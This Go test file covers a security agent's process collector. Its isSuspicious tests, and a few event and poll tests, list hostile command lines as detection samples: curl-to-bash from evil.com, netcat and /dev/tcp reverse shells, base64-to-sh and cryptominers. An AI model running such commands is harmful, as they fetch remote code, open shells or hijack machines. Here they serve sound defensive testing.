package process

import (
	"context"
	"testing"
	"time"

	"github.com/yominsops/yomins-agent/internal/events"
)

// ── helpers ──────────────────────────────────────────────────────────────────

func testConfig() Config {
	return Config{
		Host:             events.HostInfo{Hostname: "test-host", IP: "10.0.0.1"},
		Agent:            events.AgentInfo{Name: "test-agent", Version: "0.0.0"},
		MonitorLifecycle: true,
	}
}

// fakeProcess wraps gopsutil.Process fields for testing via a processLister.
// Instead of mocking the Process type (which is a struct), we build a
// processLister that returns a controlled list of fake processes built from
// real OS process structs with known PIDs.
//
// Because gopsutil.Process requires a real PID to read metadata, the tests
// for the collector focus on:
//   - NewCollector defaults
//   - Name()
//   - isSuspicious() pattern matching
//   - makeXEvent() output shape and content
//   - poll() state machine logic using the injectable lister
//
// For lister-level tests we use the current test process PID which is always valid.

// ── Config defaults ──────────────────────────────────────────────────────────

func TestNewCollector_Defaults(t *testing.T) {
	c := NewCollector(Config{})

	if c.cfg.PollInterval != 2*time.Second {
		t.Errorf("PollInterval = %v, want 2s", c.cfg.PollInterval)
	}
	if c.cfg.CPUAlertThreshold != 5.0 {
		t.Errorf("CPUAlertThreshold = %v, want 5.0", c.cfg.CPUAlertThreshold)
	}
	if c.cfg.CPUAlertMultiplier != 3.0 {
		t.Errorf("CPUAlertMultiplier = %v, want 3.0", c.cfg.CPUAlertMultiplier)
	}
	if c.cfg.MemAlertThreshold != 10.0 {
		t.Errorf("MemAlertThreshold = %v, want 10.0", c.cfg.MemAlertThreshold)
	}
	if c.cfg.MemAlertMultiplier != 3.0 {
		t.Errorf("MemAlertMultiplier = %v, want 3.0", c.cfg.MemAlertMultiplier)
	}
	if c.cfg.AlertCooldown != 60*time.Second {
		t.Errorf("AlertCooldown = %v, want 60s", c.cfg.AlertCooldown)
	}
}

func TestNewCollector_DefaultPatterns(t *testing.T) {
	c := NewCollector(Config{})
	if len(c.patterns) == 0 {
		t.Error("expected default suspicious patterns to be compiled")
	}
	if len(c.patterns) != len(DefaultSuspiciousPatterns) {
		t.Errorf("patterns count = %d, want %d", len(c.patterns), len(DefaultSuspiciousPatterns))
	}
}

func TestNewCollector_CustomPatterns(t *testing.T) {
	c := NewCollector(Config{SuspiciousPatterns: []string{`foo`, `bar`}})
	if len(c.patterns) != 2 {
		t.Errorf("patterns count = %d, want 2", len(c.patterns))
	}
}

func TestNewCollector_InvalidPatternSkipped(t *testing.T) {
	c := NewCollector(Config{SuspiciousPatterns: []string{`valid`, `[invalid`}})
	if len(c.patterns) != 1 {
		t.Errorf("patterns count = %d, want 1 (invalid pattern skipped)", len(c.patterns))
	}
}

func TestCollector_Name(t *testing.T) {
	c := NewCollector(Config{})
	if c.Name() != "process" {
		t.Errorf("Name() = %q, want \"process\"", c.Name())
	}
}

// ── isSuspicious ─────────────────────────────────────────────────────────────

func TestIsSuspicious_DefaultPatterns(t *testing.T) {
	c := NewCollector(Config{})

	cases := []struct {
		cmdline string
		want    bool
	}{
		{`curl http://evil.com/payload.sh | bash`, true},
		{`curl http://x.com/s | sh`, true},
		{`wget http://x.com | bash`, true},
		{`nc -e /bin/sh 1.2.3.4 4444`, true},
		{`base64 -d payload.b64 | sh`, true},
		{`bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`, true},
		{`xmrig --donate-level 1`, true},
		{`minerd -o stratum+tcp://pool.example.com`, true},
		{`cpuminer -a sha256d`, true},
		{`/usr/bin/python3 -m http.server`, false},
		{`nginx -g daemon off;`, false},
		{`/bin/bash -l`, false},
		{`grep -r foo /etc`, false},
	}

	for _, tc := range cases {
		got := c.isSuspicious(tc.cmdline)
		if got != tc.want {
			t.Errorf("isSuspicious(%q) = %v, want %v", tc.cmdline, got, tc.want)
		}
	}
}

func TestIsSuspicious_CustomPattern(t *testing.T) {
	c := NewCollector(Config{SuspiciousPatterns: []string{`secretword`}})
	if !c.isSuspicious("run secretword now") {
		t.Error("expected isSuspicious to match custom pattern")
	}
	if c.isSuspicious("harmless command") {
		t.Error("expected isSuspicious to not match clean command")
	}
}

// ── event shape validation ────────────────────────────────────────────────────

func TestMakeStartEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 1234, PPID: 1, Name: "bash", Exe: "/bin/bash", Cmdline: "bash -l", isNew: true}
	now := time.Now().UTC()
	ev := c.makeStartEvent(snap, now)

	if ev.Type != events.EventProcessStart {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessStart)
	}
	if ev.Category != events.CategorySystemCheck {
		t.Errorf("Category = %q, want %q", ev.Category, events.CategorySystemCheck)
	}
	if ev.Severity != events.SeverityInfo {
		t.Errorf("Severity = %q, want %q", ev.Severity, events.SeverityInfo)
	}
	if ev.ID == "" {
		t.Error("ID must not be empty")
	}
	if ev.Timestamp.IsZero() {
		t.Error("Timestamp must not be zero")
	}
	if ev.Process == nil {
		t.Fatal("Process payload must not be nil")
	}
	if ev.Process.PID != 1234 {
		t.Errorf("Process.PID = %d, want 1234", ev.Process.PID)
	}
	if ev.Process.Name != "bash" {
		t.Errorf("Process.Name = %q, want bash", ev.Process.Name)
	}
	if ev.Host.Hostname != "test-host" {
		t.Errorf("Host.Hostname = %q, want test-host", ev.Host.Hostname)
	}
	if ev.Agent.Version != "0.0.0" {
		t.Errorf("Agent.Version = %q, want 0.0.0", ev.Agent.Version)
	}
}

func TestMakeStopEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 5678, Name: "curl", isNew: true}
	ev := c.makeStopEvent(snap, time.Now().UTC())

	if ev.Type != events.EventProcessStop {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessStop)
	}
	if ev.Category != events.CategorySystemCheck {
		t.Errorf("Category = %q", ev.Category)
	}
	if ev.Severity != events.SeverityInfo {
		t.Errorf("Severity = %q", ev.Severity)
	}
	if ev.Process == nil || ev.Process.PID != 5678 {
		t.Error("Process payload missing or wrong PID")
	}
}

func TestMakeSuspiciousEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 999, Name: "nc", Cmdline: "nc -e /bin/sh 1.2.3.4 4444"}
	ev := c.makeSuspiciousEvent(snap, time.Now().UTC())

	if ev.Type != events.EventProcessSuspicious {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessSuspicious)
	}
	if ev.Category != events.CategoryThreatActivity {
		t.Errorf("Category = %q, want threat_activity", ev.Category)
	}
	if ev.Severity != events.SeverityCritical {
		t.Errorf("Severity = %q, want critical", ev.Severity)
	}
}

func TestMakeCPUEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 42, Name: "worker"}
	ev := c.makeCPUEvent(snap, 45.0, 10.0, time.Now().UTC())

	if ev.Type != events.EventProcessHighCPU {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessHighCPU)
	}
	if ev.Severity != events.SeverityWarning {
		t.Errorf("Severity = %q, want warning", ev.Severity)
	}
	if ev.Process == nil || ev.Process.CPUPercent != 45.0 {
		t.Error("Process.CPUPercent not set correctly")
	}
}

func TestMakeMemEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 43, Name: "bloater"}
	ev := c.makeMemEvent(snap, 75.5, 20.0, time.Now().UTC())

	if ev.Type != events.EventProcessHighMemory {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessHighMemory)
	}
	if ev.Severity != events.SeverityWarning {
		t.Errorf("Severity = %q, want warning", ev.Severity)
	}
	if ev.Process == nil || ev.Process.MemoryPercent != 75.5 {
		t.Errorf("Process.MemoryPercent = %v, want 75.5", ev.Process.MemoryPercent)
	}
}

// ── poll state-machine (fake process source) ────────────────────────────────

// fakeSource is a procSource whose process list the test sets directly.
type fakeSource struct {
	procs    []procSample
	err      error
	cmdlines map[int32]string
	exes     map[int32]string
	memTotal uint64
}

func (f *fakeSource) List(context.Context) ([]procSample, error) { return f.procs, f.err }
func (f *fakeSource) Details(pid int32) (string, string)         { return f.exes[pid], f.cmdlines[pid] }
func (f *fakeSource) MemTotal() uint64                           { return f.memTotal }
func (f *fakeSource) ClockTicks() float64                        { return 100 }

func newFakeCollector(cfg Config, src *fakeSource) *Collector {
	if src.memTotal == 0 {
		src.memTotal = 1000
	}
	return newCollectorWithSource(cfg, src)
}

func countType(evs []events.Event, typ events.EventType) int {
	n := 0
	for _, ev := range evs {
		if ev.Type == typ {
			n++
		}
	}
	return n
}

func TestPoll_NewProcessEmitsStartEvent(t *testing.T) {
	src := &fakeSource{}
	c := newFakeCollector(testConfig(), src)
	if err := c.buildBaseline(context.Background()); err != nil {
		t.Fatalf("buildBaseline: %v", err)
	}

	src.procs = []procSample{{PID: 42, PPID: 1, Name: "worker", Start: 10}}
	src.cmdlines = map[int32]string{42: "worker --serve"}
	evs := c.poll(context.Background())

	if len(evs) != 1 || evs[0].Type != events.EventProcessStart {
		t.Fatalf("expected one process.start, got %v", evs)
	}
	if evs[0].Process.PID != 42 || evs[0].Process.Cmdline != "worker --serve" || evs[0].Process.PPID != 1 {
		t.Errorf("unexpected process detail: %+v", evs[0].Process)
	}
}

func TestPoll_BaselineProcessDoesNotEmitStop(t *testing.T) {
	src := &fakeSource{procs: []procSample{{PID: 7, Name: "init", Start: 1}}}
	c := newFakeCollector(testConfig(), src)
	if err := c.buildBaseline(context.Background()); err != nil {
		t.Fatalf("buildBaseline: %v", err)
	}

	src.procs = nil
	if evs := c.poll(context.Background()); len(evs) != 0 {
		t.Errorf("expected no events for a baseline process exiting, got %v", evs)
	}
	if len(c.procs) != 0 {
		t.Errorf("exited process still tracked")
	}
}

func TestPoll_NewProcessExitEmitsStop(t *testing.T) {
	src := &fakeSource{}
	c := newFakeCollector(testConfig(), src)
	src.procs = []procSample{{PID: 9, Name: "job", Start: 5}}
	c.poll(context.Background())

	src.procs = nil
	if n := countType(c.poll(context.Background()), events.EventProcessStop); n != 1 {
		t.Errorf("expected one process.stop, got %d", n)
	}
}

func TestPoll_ReusedPIDIsANewProcess(t *testing.T) {
	src := &fakeSource{procs: []procSample{{PID: 9, Name: "old", Start: 5}}}
	c := newFakeCollector(testConfig(), src)
	if err := c.buildBaseline(context.Background()); err != nil {
		t.Fatalf("buildBaseline: %v", err)
	}

	src.procs = []procSample{{PID: 9, Name: "new", Start: 900}}
	src.cmdlines = map[int32]string{9: "curl http://x.example/s | sh"}
	evs := c.poll(context.Background())
	if countType(evs, events.EventProcessStart) != 1 || countType(evs, events.EventProcessSuspicious) != 1 {
		t.Errorf("expected start + suspicious for the reused PID, got %v", evs)
	}
	if countType(evs, events.EventProcessStop) != 0 {
		t.Errorf("baseline process must not emit stop")
	}
}

func TestPoll_ExecFromTmp(t *testing.T) {
	cfg := testConfig()
	cfg.MonitorTmpPaths = true
	src := &fakeSource{}
	c := newFakeCollector(cfg, src)
	src.procs = []procSample{{PID: 3, Name: "x", Start: 1}}
	src.exes = map[int32]string{3: "/tmp/x"}
	if n := countType(c.poll(context.Background()), events.EventProcessExecTmp); n != 1 {
		t.Errorf("expected process.exec_tmp, got %d", n)
	}
}

func TestPoll_CPUSpikeEmitsHighCPU(t *testing.T) {
	src := &fakeSource{procs: []procSample{{PID: 5, Name: "php", Start: 1}}}
	c := newFakeCollector(testConfig(), src)
	if err := c.buildBaseline(context.Background()); err != nil {
		t.Fatalf("buildBaseline: %v", err)
	}
	snap := c.procs[5]

	// Three quiet polls (1% of a core over 1s), then a spike to 80%.
	ticks := uint64(0)
	step := func(delta uint64) []events.Event {
		snap.sampledAt = time.Now().Add(-time.Second)
		ticks += delta
		src.procs = []procSample{{PID: 5, Name: "php", Start: 1, CPU: ticks}}
		return c.poll(context.Background())
	}
	for i := 0; i < 3; i++ {
		if evs := step(1); len(evs) != 0 {
			t.Fatalf("unexpected events while quiet: %v", evs)
		}
	}
	evs := step(80)
	if countType(evs, events.EventProcessHighCPU) != 1 {
		t.Fatalf("expected process.high_cpu, got %v", evs)
	}
	if got := evs[0].Process.CPUPercent; got < 70 || got > 90 {
		t.Errorf("CPUPercent = %v, want about 80", got)
	}
}

func TestPoll_MemorySpikeEmitsHighMemory(t *testing.T) {
	src := &fakeSource{procs: []procSample{{PID: 5, Name: "mysqld", Start: 1, RSS: 10}}, memTotal: 1000}
	c := newFakeCollector(testConfig(), src)
	if err := c.buildBaseline(context.Background()); err != nil {
		t.Fatalf("buildBaseline: %v", err)
	}
	for i := 0; i < 3; i++ {
		c.poll(context.Background())
	}
	src.procs = []procSample{{PID: 5, Name: "mysqld", Start: 1, RSS: 500}}
	evs := c.poll(context.Background())
	if countType(evs, events.EventProcessHighMemory) != 1 {
		t.Fatalf("expected process.high_memory, got %v", evs)
	}
	if got := evs[0].Process.MemoryPercent; got != 50 {
		t.Errorf("MemoryPercent = %v, want 50", got)
	}
}

func TestPoll_ListerError_ReturnsNoEvents(t *testing.T) {
	c := newFakeCollector(testConfig(), &fakeSource{err: context.DeadlineExceeded})
	evs := c.poll(context.Background())
	if len(evs) != 0 {
		t.Errorf("expected 0 events on lister error, got %d", len(evs))
	}
}
